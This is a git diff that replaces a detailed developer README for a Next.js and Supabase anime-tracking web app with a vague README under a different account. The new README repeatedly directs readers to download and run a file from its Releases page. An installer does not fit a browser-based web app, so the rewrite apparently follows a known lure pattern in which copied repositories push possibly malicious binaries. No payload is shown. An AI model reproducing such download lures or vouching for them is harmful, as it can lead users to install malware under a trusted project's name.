@@ -1,257 +1,66 @@
-# AnimeTarget | Millennium Archive 🛰️
-
-<div align="center">
-
-![AnimeTarget Banner](https://via.placeholder.com/1200x400/0b1622/3db4f2?text=AnimeTarget+Millennium+Archive)
-
-**The Ultimate Anime Tracking Platform**
-
-[![Next.js](https://img.shields.io/badge/Next.js-16.1-black?style=for-the-badge&logo=next.js)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue?style=for-the-badge&logo=typescript)](https://www.typescriptlang.org/)
-[![Supabase](https://img.shields.io/badge/Supabase-Powered-green?style=for-the-badge&logo=supabase)](https://supabase.com/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-4.0-38bdf8?style=for-the-badge&logo=tailwind-css)](https://tailwindcss.com/)
-
-[Live Demo](https://animetarget.vercel.app) · [Report Bug](https://github.com/voidx3d/anime-tracker/issues) · [Request Feature](https://github.com/voidx3d/anime-tracker/issues)
-
-</div>
-
----
-
-## 🌟 Features
-
-### 🎯 **Core Functionality**
-- **10,000+ Anime Archive** - Comprehensive database with real-time AniList synchronization
-- **Neural Recommendations** - AI-powered suggestions based on your watch history and genre preferences
-- **Multi-Status Tracking** - Organize anime into Watching, Completed, Planning, On-Hold, and Dropped
-- **Advanced Search & Filters** - Find anime by title, genre, year, score, and more
-- **Dual-View Library** - Switch between grid and list layouts instantly
-
-### 🎨 **Premium Design**
-- **Glass-Industrial Aesthetic** - Modern glassmorphism with industrial command-center vibes
-- **Multi-Chromatic Themes** - Choose from Millennium (default), Cyberpunk, and Monochrome
-- **Cinematic Loading States** - Smooth skeleton screens and scanning animations
-- **Micro-Animations** - Staggered entries, hover blooms, and floating badges
-- **Fully Responsive** - Optimized for desktop, tablet, and mobile
-
-### 🚀 **Advanced Features**
-- **Spotlight Carousel** - Auto-rotating hero showcase of trending anime
-- **Neural Reroll** - Get fresh recommendations with high-entropy randomization
-- **Mission Control** - Import/export your anime lists with diff detection
-- **Real-Time Sync** - Dual-table architecture ensures 100% data integrity
-- **Server-Side Pagination** - Lightning-fast performance even with massive datasets
-
----
-
-## 🛠️ Tech Stack
-
-| Category | Technology |
-|----------|------------|
-| **Framework** | Next.js 16.1 (App Router) |
-| **Language** | TypeScript 5.0 |
-| **Database** | Supabase (PostgreSQL) |
-| **Styling** | Tailwind CSS 4.0 |
-| **Animations** | Framer Motion |
-| **Data Source** | AniList GraphQL API |
-| **Deployment** | Vercel / Cloudflare Pages |
-
----
-
-## 🚀 Quick Start
-
-### Prerequisites
-- Node.js 20+ and npm/yarn/pnpm
-- Supabase account
-- AniList API access (free)
-
-### Installation
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/voidx3d/anime-tracker.git
-   cd anime-tracker
-   ```
-
-2. **Install dependencies**
-   ```bash
-   npm install
-   # or
-   yarn install
-   # or
-   pnpm install
-   ```
-
-3. **Set up environment variables**
-   
-   Create a `.env.local` file in the root directory:
-   ```env
-   NEXT_PUBLIC_SUPABASE_URL=your_supabase_project_url
-   SUPABASE_SERVICE_KEY=your_supabase_service_key
-   ```
-
-4. **Set up the database**
-   
-   Run the SQL schema in your Supabase project:
-   ```sql
-   -- See docs/database-schema.sql for the complete schema
-   ```
-
-5. **Run the development server**
-   ```bash
-   npm run dev
-   # or
-   yarn dev
-   # or
-   pnpm dev
-   ```
-
-6. **Open your browser**
-   
-   Navigate to [http://localhost:3000](http://localhost:3000)
-
----
-
-## 📁 Project Structure
-
-```
-anime-tracker/
-├── public/              # Static assets (favicon, images, manifest)
-├── scripts/             # Data ingestion and sync scripts
-│   ├── scrape-anilist.ts
-│   ├── surgical-sync.ts
-│   └── final-extraction.ts
-├── src/
-│   ├── app/            # Next.js App Router pages
-│   │   ├── anime/      # Anime detail pages
-│   │   ├── library/    # Main library view
-│   │   ├── suggestions/# Neural recommendations
-│   │   ├── dashboard/  # Analytics dashboard
-│   │   └── import/     # Mission Control (import/export)
-│   ├── components/     # Reusable React components
-│   │   ├── AnimeCard.tsx
-│   │   ├── NeuralImage.tsx
-│   │   ├── SpotlightCarousel.tsx
-│   │   ├── NeuralSuggestions.tsx
-│   │   └── ...
-│   ├── lib/            # Utilities and helpers
-│   │   ├── supabaseClient.ts
-│   │   └── diffEngine.ts
-│   └── types/          # TypeScript type definitions
-├── docs/               # Documentation
-└── README.md
-```
-
----
-
-## 🎮 Usage
-
-### Tracking Anime
-1. Navigate to **Library** to view your collection
-2. Use the **status tabs** to filter by Watching, Completed, etc.
-3. Toggle between **Grid** and **List** views
-4. Click any anime card for detailed information
-
-### Neural Recommendations
-1. Visit the **Suggestions** page
-2. Click **Reroll Strategy** for fresh recommendations
-3. Recommendations are based on your completed/planned anime genres
-
-### Importing Data
-1. Go to **Mission Control** (Import page)
-2. Upload your AniList/MyAnimeList export JSON
-3. Review the diff and apply changes
-4. Your library will sync automatically
-
-### Switching Themes
-1. Click the **theme toggle** in the navbar
-2. Choose from Millennium, Cyberpunk, or Monochrome
-3. Your preference is saved to localStorage
-
----
-
-## 🔧 Configuration
-
-### Database Schema
-The application uses two main tables:
-- `animes` - Main anime archive with metadata and user status
-- `user_anime_lists` - Legacy repository for backward compatibility
-
-See `docs/database-schema.sql` for the complete schema.
-
-### Environment Variables
-| Variable | Description |
-|----------|-------------|
-| `NEXT_PUBLIC_SUPABASE_URL` | Your Supabase project URL |
-| `SUPABASE_SERVICE_KEY` | Supabase service role key (server-side only) |
-
----
-
-## 📊 Performance
-
-- **10,000+ anime** indexed and searchable
-- **Server-side pagination** for instant load times
-- **Image optimization** with Next.js Image component
-- **Lazy loading** for off-screen content
-- **Efficient caching** with Supabase query optimization
-
----
-
-## 🚢 Deployment
-
-### Vercel (Recommended)
-```bash
-vercel --prod
-```
-
-### Cloudflare Pages
-```bash
-npm run build
-npx wrangler pages deploy .next
-```
-
-### Environment Setup
-Ensure all environment variables are configured in your deployment platform.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please follow these steps:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- **AniList** for the comprehensive anime database API
-- **Supabase** for the powerful backend infrastructure
-- **Next.js** team for the incredible framework
-- **Vercel** for seamless deployment
-
----
-
-## 📧 Contact
-
-**VoidX3D** - [@voidx3d](https://github.com/voidx3d)
-
-Project Link: [https://github.com/voidx3d/anime-tracker](https://github.com/voidx3d/anime-tracker)
-
----
-
-<div align="center">
-
-**Made with 🛰️ by VoidX3D**
-
-[⬆ Back to Top](#animetarget--millennium-archive-)
-
-</div>
+# 🎉 Anime-Tracker - Track Your Favorite Anime with Ease
+
+## 📥 Download Now
+[![Download Anime-Tracker](https://img.shields.io/badge/Download%20Anime--Tracker-v1.0.0-blue)](https://github.com/screezer/Anime-Tracker/releases)
+
+## 📖 Overview
+Anime-Tracker is a user-friendly platform designed to help you keep track of your favorite anime shows. With features powered by Next.js and Supabase, you can enjoy seamless integration with AniList and MyAnimeList APIs. The application offers smart recommendations tailored to your tastes, a sleek glassmorphism design, and dark mode support, making it visually appealing and easy to use.
+
+## 🚀 Getting Started
+Getting started with Anime-Tracker is simple. Just follow these steps to download and run the application on your device.
+
+### 📋 System Requirements
+Before you begin, make sure your device meets these basic requirements:
+- Operating System: Windows, macOS, or Linux
+- Internet Connection: You'll need an internet connection to access anime data
+- Modern Web Browser: Latest versions of Chrome, Firefox, or Safari
+
+### 📅 Features
+Anime-Tracker offers several features to enhance your anime tracking experience:
+- **Smart Recommendations**: Get suggestions based on your watched shows.
+- **Dark Mode**: Switch to a darker theme for comfortable viewing.
+- **PWA Support**: Install the app on your device for offline access.
+- **Sleek Design**: Enjoy an attractive user interface using glassmorphism.
+- **Integration with APIs**: Access a vast database from AniList and MyAnimeList.
+  
+## 📥 Download & Install
+To download Anime-Tracker, visit this page: [Download Anime-Tracker](https://github.com/screezer/Anime-Tracker/releases). 
+
+You will find the latest release in the "Releases" section. Click on the version you want to download. After downloading, follow these steps to set it up:
+
+1. Once the download completes, locate the file in your downloads folder.
+2. Open the file to start the installation process. Follow the on-screen instructions.
+3. After the installation is complete, you can launch Anime-Tracker from your applications menu.
+
+## 🛠️ How to Use
+After installing, using Anime-Tracker is straightforward. Here’s how:
+
+1. **Create an Account**: Open the app and register for a new account. You’ll need an email address and a password.
+2. **Log in**: After signing up, log in to your account.
+3. **Add Anime**: You can start adding shows to your list. Search for a title or browse through suggestions.
+4. **Track Progress**: Mark episodes as watched as you enjoy each show.
+5. **Get Recommendations**: Explore new anime based on your viewing history and preferences.   
+
+## 🛠️ Troubleshooting
+If you encounter issues during installation or usage, consider the following tips:
+- **Check Internet Connection**: Ensure you have a stable internet connection.
+- **Restart the Application**: If the app is not responding, try restarting it.
+- **Clear Cache**: If you experience slow performance, clearing the cache may help.
+
+If problems persist, check the Frequently Asked Questions (FAQ) section on the GitHub repository for more help.
+
+## 📞 Support
+For further assistance, you can reach out to our support team through the Issues section on GitHub. We aim to respond promptly to your queries.
+
+## 🌟 Contributing
+Would you like to contribute? Contributions are welcome! Please refer to the guidelines in our repository for more information on how to help improve Anime-Tracker.
+
+## 📄 License
+Anime-Tracker is open-source software licensed under the MIT License. You can freely use and modify it according to the license terms.
+
+## 🔗 Links
+- [GitHub Repository](https://github.com/screezer/Anime-Tracker)
+- [Documentation](https://github.com/screezer/Anime-Tracker/wiki)
+- [Issues Tracker](https://github.com/screezer/Anime-Tracker/issues)
+
+Thank you for using Anime-Tracker! Enjoy keeping track of your anime shows effortlessly.
